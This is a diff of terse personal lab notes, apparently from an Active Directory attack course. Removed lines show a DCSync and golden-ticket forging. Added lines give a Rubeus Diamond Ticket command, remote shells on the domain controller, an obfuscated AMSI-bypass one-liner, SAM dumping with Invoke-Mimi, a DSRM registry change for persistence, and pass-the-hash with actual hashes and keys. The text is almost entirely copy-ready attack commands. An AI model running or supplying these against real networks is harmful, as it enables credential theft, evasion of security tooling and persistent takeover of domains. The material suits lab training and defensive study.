@@ -1,17 +1,43 @@
-  To get NTLM hash and AES keys of the krbtgt account, we can use the DCSync attack. Run the below 
-command from process running as Domain Admin: dcorp-svcadmin 
--> C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
-Note: Run this command using svcadmin shell to request credentials for krbtgt account
+ Make sure Also see some recon and asekey for krbtgt this is needed here:.......
+Diamon ticket attack: Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack.
+-> From dcorp-dc do exit
+->klist purge 
+-> C:\AD\Tools\Rubeus.exe diamond 
+/krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
+/tgtdeleg /enctype:aes /ticketuser:administrator 
+/domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local 
+/ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt   (if getting error do logoff from system)
 
-Now copt aes256 key from kerbtg account which we got from previous output
-Run this command from cmd as admin:
-->  C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-
-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
-/startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+Access the DC using winrs from the new spawned process!
+-> winrs -r:dcorp-dc cmd
+-> set username
 
-Sid Is from domain which we got in our enum phase 
+Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence
 
-Now access domain controller account
--> dir \\dcorp-dc\c$
--> gwmi -Class win32_computersystem -ComputerName dcorp-dc
+Alreday we Compromise domain admin 
+Open normal cmd from student machine:
+->  $sess = New-PSSession dcorp-dc
+-> Enter-PSSession -Session $sess
+Bypass AMSi
+-> S`eT-It`em ( 'V'+'aR' + 'IA' + 
+('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( 
+Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( 
+"{6}{3}{1}{4}{2}{0}{5}" -
+f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'
+s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -
+f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f 
+('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( 
+${n`ULl},${t`RuE} )
+
+-> exit
+
+Load the Invoke-Mimi script in the session, Run the below command on local machine:
+-> Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -session $sess
+->Enter-PSSession -Session $sess
+-> Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'  (Copy Hash NTLM: of Administrator)
+-> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+-> Invoke-Mimi -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'  (use ntlm hash from Invoke-Mimi )
+We can now access the dcorp-dc directly from the new session.
+-> ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
+
 
